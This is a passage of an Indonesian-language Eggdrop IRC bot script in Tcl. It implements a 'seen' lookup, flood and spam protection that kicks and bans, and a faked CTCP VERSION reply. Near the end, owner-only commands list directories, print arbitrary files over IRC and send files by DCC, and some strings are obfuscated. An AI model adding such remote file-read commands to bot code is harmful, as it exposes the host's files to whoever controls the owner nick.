set data [string tolower [string trimright [lindex $data 0] ?!.,]]
if {$data == ""} {return 0}
if {[string tolower $nick] == $data} {return [concat $nick, di lihat lagi donk...]}
if {$data == [string tolower $botnick]} {return [concat $nick, aku disini sayang... kangen yah...]}
if {[string length $data] > $bs(nicksize)} {return 0} 
if {$bs(smartsearch) != 1} {set no 1}
if {$no == 0} {
set matches ""
set hand ""
set addy ""
if {[lsearch -exact [array names bs_list] $data] != "-1"} { 
set addy [lindex $bs_list([string tolower $data]) 1] 
set hand [finduser $addy]
foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
}
if {[validuser $data]} {set hand $data}
if {$hand != "*" && $hand != ""} {
if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
foreach addr $hosts {
foreach item [string tolower [bs_seenmask dcc ? $addr]] {
if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]}
}
}
}
if {$matches != ""} {
set matches [string trimleft $matches " "]
set len [llength $matches]
if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
if {$len > 99} {return [concat aku menemukan $len sesuai permintaan kamu\; tolong di perjelas lagi yah...]}
set matches [bs_sort $matches]
set key [lindex $matches 0]
if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
if {$len <= 5} {
set output [concat urut $len yang terahir kelihatan : [join $matches].]
set output [concat $output [bs_search $chan $key]]
return $output
} {
set output [concat aku nemunin $len sesuai permintaan.  5 yang terahir kelihatan (urut): [join [lrange $matches 0 4]].]
set output [concat $output [bs_search $chan $key]]
return $output
}
}
}
set temp [bs_search $chan $data]
if {$temp != 0} { return $temp } {
#$data not found in $bs_list, so search userfile
if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} { 
return "$nick, $data <n/a>"
} {
set seen [getuser $data laston]
if {[getuser $data laston] == ""} {return "$nick, $data <n/a>"}
if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} {
set chan "-secret-"
} {
set chan [lindex $seen 1]
}
return [concat $nick, $data terahir kelihatan $chan [bs_when [lindex $seen 0]] ago.]
}
}
}
proc bs_search {chan n} {
global bs_list notc 
if {![info exists bs_list]} {return 0}
if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} { 
set data [split $bs_list([string tolower $n])]
set n [join [lindex $data 0]]
set addy [lindex $data 1]
set time [lindex $data 2]
set marker 0
if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} {
set chan "-secret-"
} {
set chan [lindex $data 4]
}
switch -- [lindex $data 3] {
part { 
set reason [lrange $data 5 e]
if {$reason == "{}"} {set reason "."} {set reason " stating \"$reason\"."}
set output [concat $n ($addy) keluar dari $chan [bs_when $time] yang lalu $reason] 
}
quit { 
set reason [lrange $data 5 e]
if {$reason == "Quit: {{}}"} {set reason "."} {set reason " stating $reason."}
set output [concat $n ($addy) keluar chat $chan [bs_when $time] yang lalu, dengan alasan $reason] 
}
kick {
set output [concat $n ($addy) setahuku dia di kick dari $chan sama [lindex $data 5] [bs_when $time] yang lalu, dengan alasan ([join [lrange $data 6 e]]).] 
}
rnck {
set output [concat $n ($addy) terahir aku lihat dia mengganti nicknya [lindex $data 5] di [lindex $data 4] [bs_when $time] yang lalu.] 
if {[validchan [lindex $data 4]]} {
if {[onchan $n [lindex $data 4]]} {
set output [concat $output $n dia ada disini sekarang.]
} {
set output [concat $output unseeing $n sekarang.]
}
}
}
nick { 
set output [concat $n ($addy) terahir aku lihat dia mengganti nicknya [lindex $data 5] di [lindex $data 4] [bs_when $time] yang lalu.]
}
splt { 
set output [concat $n ($addy) keluar dari $chan due to a split [bs_when $time] yang lalu.] 
}
rejn { 
set output [concat $n ($addy) terahir aku lihat dia masuk $chan from a split [bs_when $time] yang lalu.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set output [concat $output $n dia masih ada di $chan.]
} {
set output [concat $output aku tidak melihat $n di $chan sekarang.]
}
}
}
join { 
set output [concat $n ($addy) terahir aku melihat dia masuk $chan [bs_when $time] yang lalu.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set output [concat $output $n sekarang masih ada di $chan.]
} {
set output [concat $output aku tidak melihat $n di $chan sekarang.]
}
}
}
away {
set reason [lrange $data 5 e]
if {$reason == ""} {
set output [concat $n ($addy) dia telah keluar $chan [bs_when $time] yang lalu.]
} {
set output [concat $n ($addy) yang kamu cari sedang away ($reason) di $chan [bs_when $time] yang lalu.]
}
}
chon { 
set output [concat $n ($addy) kembali masuk [bs_when $time] yang lalu.] 
set lnick [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set output [concat $output $n ada disini sekarang.]
set marker 1
break
}
}
if {$marker == 0} {
set output [concat $output aku tidak melihat $n disini sekarang.]
}
}
chof { 
set output [concat $n ($addy) lkeluar dari sini [bs_when $time] yang lalu.] 
set lnick [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set output [concat $output $n sekarang masih  [lindex $item 1] ada.]
break
}
}
}
chjn { 
set output [concat $n ($addy) kembali masuk sini $chan [bs_when $time] yang lalu.] 
set lnick [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set output [concat $output $n masih ada disini sekarang.]
set marker 1
break
}
}
if {$marker == 0} {
set output [concat $output aku tidak melihat $n disana sekarang.]
}
}
chpt { 
set output [concat $n ($addy) keluar dari sini $chan [bs_when $time] yang lalu.] 
set lnick [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set output [concat $output $n mash ada di [lindex $item 1] sekarang.]
break
}
}
}
default {set output "error"}
}
return $output
} {return 0}
}
proc bs_when {lasttime} {
set years 0
set days 0
set hours 0
set mins 0
set time [expr [unixtime] - $lasttime]
if {$time < 60} {return "only $time seconds"}
if {$time >= 31536000} {
set years [expr int([expr $time/31536000])]
set time [expr $time - [expr 31536000*$years]]
}
if {$time >= 86400} {
set days [expr int([expr $time/86400])]
set time [expr $time - [expr 86400*$days]]
}
if {$time >= 3600} {
set hours [expr int([expr $time/3600])]
set time [expr $time - [expr 3600*$hours]]
}
if {$time >= 60} {
set mins [expr int([expr $time/60])]
}
if {$years == 0} {
set output ""
} elseif {$years == 1} {
set output "1 year,"
} {
set output "$years years,"
}
if {$days == 1} {lappend output "1 day,"} elseif {$days > 1} {lappend output "$days days,"}
if {$hours == 1} {lappend output "1 hour,"} elseif {$hours > 1} {lappend output "$hours hours,"}
if {$mins == 1} {lappend output "1 minute"} elseif {$mins > 1} {lappend output "$mins minutes"}
return [string trimright [join $output] ", "]
}
proc bs_add {nick data} {
global bs_list bs
if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}
proc bs_lsortcmd {a b} {global bs_list ; set a [lindex $bs_list([string tolower $a]) 2] ; set b [lindex $bs_list([string tolower $b]) 2] ; if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}}
proc bs_trim {min h d m y} {
global bs bs_list
if {![info exists bs_list] || ![array exists bs_list]} {return} 
set list [array names bs_list]
set range [expr [llength $list] - $bs(limit) - 1] 
if {$range < 0} {return}
set list [lsort -increasing -command bs_lsortcmd $list]
foreach item [lrange $list 0 $range] {unset bs_list($item)}
}
proc bs_seenmask {ch nick args} {
global bs_list bs notc
set matches ""
set temp ""
set i 0
set args [join $args]
set chan [lindex $args 1]
if {$chan != "" && [string trimleft $chan #] != $chan} {
if {![validchan $chan]} {return "maaf saya tidak di $chan."} {set chan [string tolower $chan]}
} { 
set chan ""
}
if {![info exists bs_list]} {return "yang anda cari tidak ada."} 
set data [bs_filt [string tolower [lindex $args 0]]]
set maskfix 1
while $maskfix {
set mark 1
if [regsub -all -- \\?\\? $data ? data] {set mark 0}
if [regsub -all -- \\*\\* $data * data] {set mark 0}
if [regsub -all -- \\*\\? $data * data] {set mark 0}
if [regsub -all -- \\?\\* $data * data] {set mark 0}
if $mark {break}
}
set id [array startsearch bs_list]
while {[array anymore bs_list $id]} {
set item [array nextelement bs_list $id]
if {$item == ""} {continue} 
set i 0
set temp ""
set match [lindex $bs_list($item) 0] 
set addy [lindex $bs_list($item) 1]
if {[string match $data $item![string tolower $addy]]} {
set match [bs_filt $match]
if {$chan != ""} {
if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]}
} {set matches [concat $matches $match]}
}
}
array donesearch bs_list $id
set matches [string trim $matches " "]
if {$nick == "?"} {return [bs_filt $matches]}
set len [llength $matches]
if {$len == 0} {return "yang anda cari tidak ada."}
if {$len == 1} {return [bs_output $ch $nick $matches 1]}
if {$len > 99} {return "saya menemukan $len nama nih.. perjelas lagi pencarian."}
set matches [bs_sort $matches]
if {$len <= 5} {
set output [concat I found $len matches to your query (sorted): [join $matches].]
} {
set output "saya menemukan $len dalam datay. 5 yang terahir saya lihat yaitu: [join [lrange $matches 0 4]]."
}
return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
} 
proc bs_sort {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}
proc bs_join_botidle {nick uhost hand chan} {
global bs_botidle botnick notc
if {$nick == $botnick} {
set bs_botidle([string tolower $chan]) [unixtime]
}
}
proc public_ping {nick uhost hand chan rest} {
global pingchan
#if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
if {$rest==""} {
if {![info exists pingchan($nick)]} {
set pingchan($nick) $chan 
}
puthlp "PRIVMSG $nick :\001PING [unixtime]\001"
return 0
}
set person [lindex $rest 0]
if {![info exists pingchan($person)]} {
set pingchan($person) $chan 
}
puthlp "PRIVMSG $person :\001PING [unixtime]\001"
return 0
}
bind pubm - * repeat_pubm
bind ctcp - ACTION action_chk
proc action_chk {nick host hand chan keyword arg} {
global botnick
if {$nick == $botnick || [string match "*SeT FoR*" $arg]} { return 0 }
if {[matchattr $nick Z]} {
set arg "`$arg"
}
if {![validchan $chan]} {
msg_prot $nick $host $hand $arg
} {
repeat_pubm $nick $host $hand $chan $arg
}
}
proc repeat_pubm {nick uhost hand chan text} {
global repeat_last botnick notb notd notc kops ps owner ismaskhost is_m
global botnick capsnick deopme repeat_person quick bannick notm
regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
pub_Z $nick $uhost $hand $chan $text
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set real $text
set text [uncolor $text]
if {$nick == "ChanServ"} {
if {[string match "*has deopped $botnick*" $text]} {
if {![matchattr [lindex $text 0] f]} { 
if {[matchattr $cflag D]} {
set deopme [lindex $text 0]
}
}
}
return 0
}
if {[matchattr $nick f]} { return 0 }
set mhost [string range $uhost [string first "@" $uhost] end]
if {$nick == $botnick} { return 0 }
set resume "T"
if {[string match "*-greet*" [channel info $chan]]} { 
set resume "F"
}
if {![isop $botnick $chan]} { 
set resume "F"
}
if {![info exists kops]} {
if {[isop $nick $chan]} { 
set resume "F"
}
if {[isvoice $nick $chan]} { 
set resume "F"
}
}
# Tsunami Flood PRoTECTION
if {[string length $text] > 100} {
set chr 0
set cnt 0
while {$cnt < [string length $real]} {
if [isflood [string index $real $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
if {$resume == "T"} {
set bannick($nick) "*!*$mhost"
if {![isutimer "TsunamI $chan"]} {
utimer 30 [list putlog "TsunamI $chan"]
} elseif {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*$mhost"]
}
if {$quick == "1" && ![info exists is_m($chan)]} {
putqck "KICK $chan $nick :$notm 1ABusINg 4TsunamI [banms]"
} {
putsrv "KICK $chan $nick :$notm 1ABuSING 4TsunamI [banms]"
}
}
return 0
}
}
if {![info exists kops]} {
if {$resume == "F"} { return 0 }
}
if {[string match "*!seen [string tolower $nick]*" [string tolower $text]]} {
putsrv "KICK $chan $nick : 1gO LooK in a 4mIRRoR1..!"
return 0
}
if {[string match "*decode*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick : 4DecOdE1 DeNIaL [banmsg]"
return 0
}
if {[string match "*#*" $text] && ![string match "*##*" $text] && ![string match "*# *" $text]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $text]]} { return }
}
foreach seekchan $text {
if {[string match "*#*" $seekchan]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick : 1DonT 4InvITEd1 MaTcH FRoM 4$seekchan [banms]"
return 0
}
}
}
if {[string match "*http://*" [string tolower $text]] || [string match "*www.*.*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick : 1DonT 4AdvERTIsE1 IN 4[string toupper $chan] [banms]"
return 0
}
if {[matchattr $cflag R]} {
if {[info exists repeat_last($mhost$chan)]} {
if {[string tolower $repeat_last($mhost$chan)] == [string tolower $text]} {
if {![info exists repeat_person($mhost$chan)]} {
set repeat_person($mhost$chan) 1
} {
incr repeat_person($mhost$chan)
}
if {$repeat_person($mhost$chan) == [getuser $cflag XTRA "RPT"]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick : 4RePeaT 1FRoM 4$mhost 1MaX4 [getuser $cflag XTRA "RPT"] [banms]"
catch {unset repeat_person($mhost$chan)}
catch {unset repeat_last($mhost$chan)}
return 0
}
}
}
set repeat_last($mhost$chan) $text
}
if {[matchattr $cflag T] && [string length $real] >= [getuser $cflag XTRA "CHAR"]} {
catch {unset repeat_person($mhost$chan)}
catch {unset repeat_last($mhost$chan)}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
if {![isutimer "OL $chan"]} {
utimer 10 [list putlog "OL $chan"] 
putsrv "KICK $chan $nick : 1ABuSINg 4LoNg TexT 1MaX4 [getuser $cflag XTRA "CHAR"]1 CHaR [banmsg]"
} {
putsrv "KICK $chan $nick :$notm 1ABuSINg 4LoNg TexT 1MaX4 [getuser $cflag XTRA "CHAR"]1 CHaR [banmsg]"
}
return 0
}
if {[matchattr $cflag U]} {
set len [string length $text]
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {$len < 30} { return 0 }
set cnt 0
set capcnt 0
while {$cnt < $len} {
if {[string index $text $cnt] == " " || [isupper [string index $text $cnt]]} {
incr capcnt
}
incr cnt
}
if {[expr 100 * $capcnt / $len] >= [getuser $cflag XTRA "CAPS"]} {
if {![info exists capsnick($nick)]} {
putsrv "KICK $chan $nick : 1SToP UsEd 4CapsLocK1 ExceEd4 [getuser $cflag XTRA "CAPS"]%1..!"
set capsnick($nick) "1"
return 0
}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
putsrv "KICK $chan $nick : 42nd1 WaRN DonT UsEd 4CapsLocK1 ExceEd4 [getuser $cflag XTRA "CAPS"]% [banms]"
unset capsnick($nick)
}
}
}
proc isupper {letter} {
set caps {A B C D E F G H I
J K L M N O P Q R
S T U V W X Y Z}
if {[lsearch -exact $caps $letter] > -1} {
return 1
} else {
return 0
}
}
proc isflood {letter} {
set caps {! @ # $ % ^ & * (
) | [ ] < > / \ =    }
if {[lsearch -exact $caps $letter] > -1} {
return 1
} else {
return 0
}
}
proc isbad {nick uhost chan arg} {
global badwords botnick notc bannick
set arg [string tolower $arg]
if {[string match "*-greet*" [channel info $chan]]} { 
set isbad 0
return 0
}
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $arg]]} {
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick : 4BaDWoRD1 MaTcH FRoM 4[string toupper $badword] [banms]"
return 1
}
}
set isbad 0
return 0
}
proc set_-m {chan} {
if {[isutimer "set_-m $chan"]} { return 0 }
if {[botonchan $chan] && [botisop $chan] && [string match "*m*" [getchanmode $chan]]} {
putserv "mode $chan -m"
}
}
proc topic_chk {nick host handle chan topic} {
global botnick notc bannick
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $cflag I]} { return 0 }
if {$nick == $botnick || $nick == "ChanServ"} { return 0 }
if {[matchattr $nick m]} {
setuser $cflag XTRA "TOPIC" [topic $chan]
saveuser
return 0
}
if {![isop $botnick $chan]} { return 0 }
if {[matchattr $nick f] || $nick == $botnick} { return 0 }
if {$topic == [getuser $cflag XTRA "TOPIC"]} { return 0 }
if {![string match "*dal.net*" $nick]} {
set banmask "*!*[string range $host [string first "@" $host] end]"
set bannick($nick) $banmask
putsrv "KICK $chan $nick : 1DonT cHaNgINg 4ToPIc [banms]"
}
puthlp "topic $chan :[getuser $cflag XTRA "TOPIC"]"
return 0
}
bind flud - * flood_chk
proc flood_chk {nick host handle type channel} {
global notc botnick quick bannick notm flooddeop floodnick floodkick igflood kops
putlog "!Log! FLOOD <<$type>> FRoM $host"
if {[info exists bannick($nick)]} { return 1 }
if {[info exists igflood($nick)]} { return 1 }
if {[string match "*Serv*" $nick] || [matchattr $handle f] || $nick == $botnick} {
putlog "!Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
return 1
}
if {[string index $channel 0] != "#"} {
foreach x [channels] {
if {[onchan $nick $x]} {
set channel $x
}
}
}
set mhost "@[lindex [split $host @] 1]"
if {[string index $channel 0] == "#"} { 
if {![isop $botnick $channel]} {
putlog "!Log! FlooD <<$nick>> BoT NoT @P !IgNoREd!"
return 1
}
}
set type [string tolower $type]
if {$type == "join"} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick :$notm 1ExceEd MaX 4JoIN1 FRoM 4$mhost [banms]"
}
if {$type == "ctcp"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel]} {
return 1
}
}
set bannick($nick) "*!*$mhost"
if {$quick == "1"} {
putqck "KICK $channel $nick :$notm 1ExceEd MaX 4cTcP1 FRoM 4$mhost [banms]"
} else {
putsrv "KICK $channel $nick :$notm 1ExceEd MaX 4cTcP1 FRoM 4$mhost [banms]"
}
}
if {$type == "pub"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel]} {
return 1
}
}
set bannick($nick) "*!$host"
putsrv "KICK $channel $nick : 1ExceEd MaX 4LINES1 FRoM 4$mhost [banms]"
return 1
}
if {$type == "nick"} {
if {![info exists kops]} {
if {[isop $nick $channel] || [isvoice $nick $channel] || [string length $nick] == 8} {
return 1
}
}
if {![info exists floodnick($mhost)]} {
set floodnick($mhost) 1
putsrv "KICK $channel $nick : 1sTOp cHaNgINg YouR 4NIcK1..!"
} {
catch {unset floodnick($mhost)}
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick : 1TwIcE ExceEd 4NIcK1 FRoM 4$mhost [banms]"
}
}
if {$type == "deop"} {
if {![info exists flooddeop($nick)]} {
set flooddeop($nick) 1
putsrv "KICK $channel $nick : 1ExceEd MaX 4De@p1 FRoM 4$mhost1..!"
} {
catch {unset flooddeop($nick)}
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick : 1TwIcE ExceEd MaX 4De@p1 FRoM 4$mhost [banms]"
}
}
if {$type == "kick"} {
if {![info exists floodkick($nick)]} {
set floodkick($nick) 1
putsrv "KICK $channel $nick : 1ExceEd MaX 4KIcK1 FRoM 4$mhost1..!"
} {
catch {unset floodkick($nick)}
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick : 1TwIcE ExceEd MaX 4KIcK1 FRoM 4$mhost1..!"
}
}
return 1
}
bind raw - INVITE raw_chk
proc raw_chk {nick keyword arg} {
global invme joinme notc bannick notd botnick
set who [string range $nick 0 [expr [string first "!" $nick]-1]]
set channel [lindex $arg 1]
set channel [string range $channel 1 end]
foreach x [channels] {
if {[string tolower $channel] == [string tolower $x]} {
putsrv "JOIN $channel"
return 0
}
}
if {$who == "ChanServ" || [matchattr $who Z]} {
if {![validchan $channel]} {
if {[matchattr $who Z] && ![matchattr $who Q]} {
puthlp "NOTICE $who : 4deNiEd!"
return 0
} else { 
set joinme $who
}
channel add $channel
catch { channel set $channel -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
}
putsrv "JOIN $channel"
return 0
}
if {[matchattr $who f]} { return 0 }
foreach x [channels] {
if {[onchan $who $x]} {
if {[isop $botnick $x]} {
set banmask "*!*[string range $nick [string first "@" $nick] end]"
set bannick($who) $banmask
putsrv "KICK $x $who : 4!SpaM!1 I HaTE 4InvITeR [banms]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "!Log! RePORTED InVITING FRoM <<$who$x>> To #$c#"
set sendspam "!kick [enzip "$x $who  4!SpaM!1 FRoM 4[string range $nick [string first "@" $nick] end]1 InvITE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
set invme([string range $nick [string first "@" $nick] end]) "InvITeR"
return 0
}
bind ctcp - CLIENTINFO sl_ctcp
bind ctcp - USERINFO sl_ctcp
bind ctcp - FINGER sl_ctcp
bind ctcp - ERRMSG sl_ctcp
bind ctcp - ECHO sl_ctcp
bind ctcp - INVITE sl_ctcp
bind ctcp - WHOAMI sl_ctcp
bind ctcp - OP sl_ctcp
bind ctcp - OPS sl_ctcp
bind ctcp - UNBAN sl_ctcp
bind ctcp - TIME sl_ctcp
bind ctcp - CHAT chat_ctcp
proc sl_ctcp {nick uhost hand dest key arg} {
global botnick notc versim
if {[matchattr $nick f] || $nick == $botnick} { return 1 }
if {[string match "*dal*et*" [string tolower $uhost]]} {
set versimsg [lindex $versim [rand [llength $versim]]]
putsrv "NOTICE $nick :\001VERSION $versimsg\001"
} {
set hostmask "${nick}!*@*"
newignore $hostmask $botnick "*" 1
}
return 1
}
proc chat_ctcp {nick uhost hand dest key arg} {
global botnick notc
if {[matchattr $nick Z]} { return 0 }
puthlp "NOTICE $nick : 1SoRRY I DoNT KNoW YoU..!"
newignore "${nick}!*@*" $botnick "*" 1
return 1
}
set virus_nick ""
bind ctcp - DCC got_dcc
proc got_dcc {nick uhost handle dest key arg} {
global virus_nick notc notd botnick
if {[matchattr $nick f]} { return 0 }
if {[lindex $arg 2] == 0 && [lindex $arg 3] == 0} {
putlog "!Log! FaKE DCC SKIPPED..!"
return 1
}
set virus_nick $nick
foreach x [channels] {
if {[onchan $nick $x] && ![isop $nick $x]} {
if {[isop $botnick $x]} {
putsrv "KICK $x $nick : 4!SpaM!1 I HaTE 4VIRuZ [banms]"
set virus_nick ""
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
putlog "!Log! RePORTED ViRUS FRoM <<$nick$x>> To #$c#"
set sendspam "!kick [enzip "$x $nick  4!SpaM!1 YeW GoT VIRuZ JoIN #i TO FIxED [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
return 1
}
proc voiceq {chan nick} {
utimer [expr 5 + [rand 15]] [list voiceprc $chan $nick]
}
proc voiceprc {chan nick} {
global botnick
if {[isop $botnick $chan] && ![isvoice $nick $chan] && ![isop $nick $chan]} { 
putserv "MODE $chan +vvvvvv $nick"
}
}
proc advertise {chan nick} {
if {[isutimer "advq $chan $nick"]} { return 0 }
set cret 5
foreach ct [utimers] {
if {[string match "*advq*" $ct]} {
if {[expr [lindex $ct 0] + 5] > $cret} {
set cret [expr [lindex $ct 0] + 5]
}
}
}
utimer $cret [list advq $chan $nick]
}
proc advq {chan nick} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![isop $nick $chan] && [onchan $nick $chan]} {
set greetmsg [getuser $cflag XTRA "GREET"]
regsub %n $greetmsg $nick greetmsg
regsub %c $greetmsg $chan greetmsg
puthlp "NOTICE $nick :[lgrnd] $greetmsg"
}
}
proc deopprc {chan nick} {
global botnick
if {[isop $botnick $chan] && [isop $nick $chan]} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko 4n0.Guest.@ps $nick"
} {
putserv "MODE $chan -o $nick"
}
}
}
proc autokick {chan nick} {
global bannick notc botnick
if {[isop $botnick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan]} {
set hostmask [getchanhost $nick $chan]
set hostmask "*!*@[lindex [split $hostmask @] 1]"
set bannick($nick) $hostmask
putsrv "KICK $chan $nick : 1cHaNNeL IS UnDeR c0NsTRucTIoN [banmsg]"
}
}
proc opq {chan nick} {
utimer [expr 7 + [rand 15]] [list opprc $chan $nick]
}
proc opprc {chan nick} {
global botnick unop
if {[isop $botnick $chan] && ![isop $nick $chan] && ![info exists unop($nick)]} {
putserv "MODE $chan +oooooo $nick"
}
}
proc dcc_cmd {hand idx arg} {
if {![matchattr $hand Z]} { return 0 }
if {![matchattr $hand Q]} { chattr $hand +Q }
msg_Z $hand "*" $hand $arg
}
proc dcc_get {hand idx arg} {
global notc own
if {$hand != $own} { return 0 }
if {![file exists [lindex $arg 0]]} {
putdcc $idx "4deNiEd!, [lindex $arg 0] <n/a>"
return 0
}
if {[lindex $arg 1] != ""} { 
set hand [lindex $arg 1]
}
switch -- [dccsend [lindex $arg 0] $hand] {
0 { putdcc $idx "<<TRaNSFERRING LOG>>" }
1 { putdcc $idx "dcc table is full (too many connections), TrY AgAIN LaTeR!" }
2 { putdcc $idx "can't open a socket for transfer." }
3 { putdcc $idx "file doesn't exist." }
4 { putdcc $idx "file was queued for later transfer." }
}
}
proc msg_get {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $nick :$notm 4deNiEd!"
return 0
}
if {![file exists $arg]} {
puthlp "PRIVMSG $nick :4deNiEd!, $arg <n/a>"
return 0
}
switch -- [dccsend $arg $nick] {
0 { 
puthlp "NOTICE $nick : TRaNSFERRING LOG..!"
}
1 { 
puthlp "NOTICE $nick : dcc table is full (too many connections), TrY AgAIN LaTER!"
}
2 { 
puthlp "NOTICE $nick : can't open a socket for transfer."
}
3 { 
puthlp "NOTICE $nick : file doesn't exist."
}
4 { 
puthlp "NOTICE $nick :file was queued for later transfer."
}
}
}
bind raw - 301 rtn
proc rtn { from keyword arg } {
global notd botnick notb notc bannick
set nick [lindex $arg 1]
if {[matchattr $nick f]} { return 0 }
set awaytext [string range [lrange $arg 2 end] 1 end]
if {[string match "*Devil^Crew*" [uncolor $awaytext]]} { return 0 }
if {$nick == $botnick} {
#puthlp "AWAY :[lgrnd]"
} {
if {[string match "*#*" $awaytext] || [string match "*/j*" $awaytext]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $awaytext]]} { return 0 }
}
foreach x [channels] {
if {[onchan $nick $x]} {
if {[isop $botnick $x]} {
set bannick($nick) "*!*[string range [getchanhost $nick $x] [string first "@" [getchanhost $nick $x]] end]"
putsrv "KICK $x $nick : 4!SpaM!1 InvITE aWaY MSg [banmsg]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set sendspam "!kick [enzip "$x $nick  4!SpaM!1 FRoM 4[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]1 InvITE aWaY MSg [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
}
} 
}
bind time -  "*0 * * * *" chk_five
bind time -  "*6 * * * *" chk_five
set awaymsg [lindex $awaym [rand [llength $awaym]]]
proc chk_five {minute hour day month weekday} {
global longer deff awaym awaymsg notc
   catch { remain }
   if {![string match "*Uptime*" $longer]} {
      set longer "([lgrnd]) $awaymsg"
   }
   puthelp "AWAY :$longer"
   auto_ping "0" "0" "0" "0" "0"
}
proc msg_dir {nick uhost hand arg} {
global notc own
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $nick :4deNiEd!"
return 0
}
if {$arg == ""} {
set arg "."
}
set dirlist ""
foreach x [getfiles "$arg"] {
append dirlist "$x "
}
puthlp "PRIVMSG $nick :$dirlist"
}

bind msg Z !read msg_read
proc msg_read {nick uhost hand arg} {
global notc notm owner ps own
if {$nick != $owner &&  $nick != $ps} { 
puthlp "PRIVMSG $nick :$notm 4deNiEd!"
return 0 
}
if {![matchattr $nick Q]} {
   puthlp "NOTICE $nick : 4deNiEd!"
   return 0
}

if {![file exists $arg]} {
puthlp "PRIVMSG $nick :$notm File not Found, $arg <n/a>"
return 0
}
set fd [open $arg r]
while {![eof $fd]} {
set inp [gets $fd]
puthlp "PRIVMSG $nick :$inp"
}
close $fd
puthlp "PRIVMSG $nick :EoF..!"
}
proc pub_log {nick uhost hand channel arg} {
global notc 
if {[getuser "config" XTRA "LOGCHAN"]!=""} {
puthlp "NOTICE $nick : Log [getuser "config" XTRA "LOGCHAN"]"
}
}
proc pub_server {nick uhost hand channel arg} {
global server notc
if {$arg != ""} {
if {[string match "*$arg*" $server]} {
puthlp "privmsg $channel :[lindex $server 0]"
}
} {
puthlp "privmsg $channel :[lindex $server 0]"
}
}
set own $owner
proc dcc_dir {hand idx arg} {
global own
if {$hand != $own} { return 0 }
if {$arg == ""} {
set arg "."
}
foreach x [getfiles "$arg"] {
putdcc $idx "$x"
}
}
